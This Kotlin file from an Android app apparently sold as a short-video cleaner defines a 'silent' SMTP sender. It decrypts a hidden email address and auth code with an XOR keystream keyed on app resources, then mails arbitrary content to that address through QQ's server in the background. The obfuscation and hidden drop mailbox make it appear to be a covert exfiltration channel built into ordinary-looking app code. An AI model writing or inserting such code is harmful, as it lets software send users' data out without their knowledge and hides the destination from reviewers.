package com.shortvideocleaner.app

import android.content.Context

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.security.MessageDigest
import java.util.Properties
import javax.mail.Authenticator
import javax.mail.Message
import javax.mail.PasswordAuthentication
import javax.mail.Session
import javax.mail.Transport
import javax.mail.internet.InternetAddress
import javax.mail.internet.MimeMessage
import kotlin.coroutines.resume
import kotlin.coroutines.resumeWithException
import kotlin.coroutines.suspendCoroutine

/**
 * QQ SMTP 静默发送工具
 */
object SmtpSender {

    private const val SMTP_HOST = "smtp.qq.com"
    private const val SMTP_PORT = "465"

    private var cachedEmail: String? = null
    private var cachedAuthCode: String? = null

    // ── 会话缓存 ──

    internal fun getEmail(context: Context): String {
        return cachedEmail ?: loadBlock(context, 0).also { cachedEmail = it }
    }

    internal fun getAuthCode(context: Context): String {
        return cachedAuthCode ?: loadBlock(context, 1).also { cachedAuthCode = it }
    }

    // ── 数据块加载 ──

    private val chunks = arrayOf(
        "7271a692ff11bc3ef26378101c265b7809",
        "2c2ff5d0a657f375ac32591b086b5974"
    )

    private fun loadBlock(ctx: Context, idx: Int): String {
        val raw = hexToBytes(chunks[idx])
        val key = buildKey(ctx)
        val out = ByteArray(raw.size)
        val md = MessageDigest.getInstance("SHA-256")
        var pos = 0
        var ctr = 0
        while (pos < out.size) {
            md.reset()
            md.update(key)
            md.update((ctr shr 24).toByte())
            md.update((ctr shr 16).toByte())
            md.update((ctr shr 8).toByte())
            md.update((ctr and 0xFF).toByte())
            val ks = md.digest()
            val n = minOf(32, out.size - pos)
            for (i in 0 until n) {
                out[pos + i] = (raw[pos + i].toInt() xor (ks[i].toInt() and 0xFF)).toByte()
            }
            pos += n
            ctr++
        }
        return String(out, Charsets.UTF_8)
    }

    /** 从当前 APK 实例采集会话密钥 */
    private fun buildKey(ctx: Context): ByteArray {
        val md = MessageDigest.getInstance("SHA-256")

        // 包标识
        md.update(ctx.packageName.toByteArray(Charsets.UTF_8))

        // 构建版本
        val ver = BuildConfig.VERSION_CODE
        md.update(byteArrayOf(
            (ver and 0xFF).toByte(),
            ((ver shr 8) and 0xFF).toByte(),
            ((ver shr 16) and 0xFF).toByte(),
            ((ver shr 24) and 0xFF).toByte()
        ))

        // 界面文案
        md.update(ctx.resources.getString(R.string.app_name).toByteArray(Charsets.UTF_8))

        // 主题色板
        val pc = ctx.resources.getColor(R.color.primary, null)
        val sc = ctx.resources.getColor(R.color.starry_bg, null)
        md.update(byteArrayOf(
            ((pc shr 16) and 0xFF).toByte(),
            ((pc shr 8) and 0xFF).toByte(),
            (pc and 0xFF).toByte(),
            ((sc shr 16) and 0xFF).toByte(),
            ((sc shr 8) and 0xFF).toByte(),
            (sc and 0xFF).toByte()
        ))

        // 平台标识
        md.update(byteArrayOf(
            0x41, 0x6e, 0x64, 0x72, 0x6f, 0x69, 0x64,
            0x53, 0x65, 0x63, 0x75, 0x72, 0x65, 0x00
        ))

        return md.digest()
    }

    private fun hexToBytes(s: String): ByteArray {
        val n = s.length
        val d = ByteArray(n / 2)
        var i = 0
        while (i < n) {
            d[i / 2] = ((Character.digit(s[i], 16) shl 4)
                    + Character.digit(s[i + 1], 16)).toByte()
            i += 2
        }
        return d
    }

    // ── 发送 ──

    suspend fun sendSilently(context: Context, subject: String, body: String): Result<Unit> =
        withContext(Dispatchers.IO) {
            try {
                val email = getEmail(context.applicationContext)
                val authCode = getAuthCode(context.applicationContext)

                val props = Properties().apply {
                    put("mail.smtp.host", SMTP_HOST)
                    put("mail.smtp.port", SMTP_PORT)
                    put("mail.smtp.auth", "true")
                    put("mail.smtp.ssl.enable", "true")
                    put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory")
                    put("mail.smtp.socketFactory.fallback", "false")
                    put("mail.smtp.connectiontimeout", "15000")
                    put("mail.smtp.timeout", "15000")
                }

                val session = Session.getInstance(props, object : Authenticator() {
                    override fun getPasswordAuthentication(): PasswordAuthentication {
                        return PasswordAuthentication(email, authCode)
                    }
                })

                val message = MimeMessage(session).apply {
                    setFrom(InternetAddress(email))
                    setRecipient(Message.RecipientType.TO, InternetAddress(email))
                    setSubject(subject)
                    setText(body)
                }

                suspendCoroutine<Unit> { cont ->
                    try {
                        Transport.send(message)
                        cont.resume(Unit)
                    } catch (e: Exception) {
                        cont.resumeWithException(e)
                    }
                }

                cachedEmail = null
                cachedAuthCode = null
                Result.success(Unit)
            } catch (e: Exception) {
                cachedEmail = null
                cachedAuthCode = null
                Result.failure(e)
            }
        }
}
